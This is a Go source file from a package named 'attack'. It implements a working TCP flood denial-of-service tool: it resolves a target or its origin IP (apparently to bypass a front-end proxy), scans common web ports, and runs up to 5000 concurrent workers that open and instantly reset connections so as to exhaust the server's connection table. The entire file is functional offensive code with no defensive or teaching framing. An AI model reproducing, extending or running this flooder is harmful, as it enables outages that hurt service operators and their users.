package attack

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func runSynFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	targetHost, targetPort := parseL4Target(cfg)

	addrs, err := net.LookupHost(targetHost)
	if err != nil || len(addrs) == 0 {
		log.Printf("[SYN] Cannot resolve %s: %v", targetHost, err)
		return
	}
	targetIP := addrs[0]
	log.Printf("[SYN] Target: %s (%s) port %d", targetHost, targetIP, targetPort)

	// Auto port scan when origin IP is known
	if cfg.OriginIP != "" {
		log.Printf("[SYN] Scanning ports on %s...", targetIP)
		openPorts := ProbePorts(targetIP, []int{80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000,
			2082, 2083, 2087, 2096, 81, 591, 8008, 8081, 8082, 9090, 10000}, 500*time.Millisecond)
		if len(openPorts) > 0 {
			log.Printf("[SYN] Open ports: %v", openPorts)
			found := false
			for _, p := range openPorts {
				if p == targetPort {
					found = true
					break
				}
			}
			if !found {
				targetPort = openPorts[0]
			}
		}
	}

	// MAX POWER workers
	workerCount := cfg.Threads
	if workerCount < 100 {
		workerCount = 200
	}
	if workerCount > 5000 {
		workerCount = 5000
	}

	perWorkerPPS := max(1, cfg.RPS/workerCount)
	log.Printf("[SYN] Workers: %d, PPS/worker: %d, Target: %s:%d",
		workerCount, perWorkerPPS, targetIP, targetPort)

	var wg sync.WaitGroup
	rateInterval := time.Second / time.Duration(perWorkerPPS)

	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[SYN] Worker %d recovered: %v", id, r)
				}
			}()

			portBase := 20000 + id*10

			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}

				// TCP SYN flood via fast connect + RST
				// Random source port to fill server connection table
				srcPort := portBase + rand.Intn(100)
				dialer := net.Dialer{
					LocalAddr: &net.TCPAddr{Port: srcPort},
					Timeout:   2 * time.Second,
				}

				atomic.AddInt64(&metrics.TotalRequests, 1)
				conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort))
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
				} else {
					atomic.AddInt64(&metrics.Completed, 1)
					// RST immediately - don't complete handshake properly
					if tcpConn, ok := conn.(*net.TCPConn); ok {
						tcpConn.SetLinger(0)
					}
					conn.Close()
				}

				if rateInterval > 0 {
					time.Sleep(rateInterval)
				}
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func parseL4Target(cfg *AttackConfig) (string, int) {
	raw := cfg.Target
	defPort := 80

	if cfg.OriginIP != "" {
		host := cfg.OriginIP
		if parsed, err := url.Parse(cfg.Target); err == nil {
			if parsed.Scheme == "https" {
				defPort = 443
			}
			if p := parsed.Port(); p != "" {
				fmt.Sscanf(p, "%d", &defPort)
			}
		}
		return host, defPort
	}

	raw = strings.TrimPrefix(raw, "https://")
	raw = strings.TrimPrefix(raw, "http://")
	if idx := strings.Index(raw, "/"); idx > 0 {
		raw = raw[:idx]
	}

	host := raw
	if idx := strings.LastIndex(raw, ":"); idx > 0 {
		fmt.Sscanf(raw[idx+1:], "%d", &defPort)
		host = raw[:idx]
	}
	if strings.HasPrefix(cfg.Target, "https://") {
		defPort = 443
	}

	return host, defPort
}

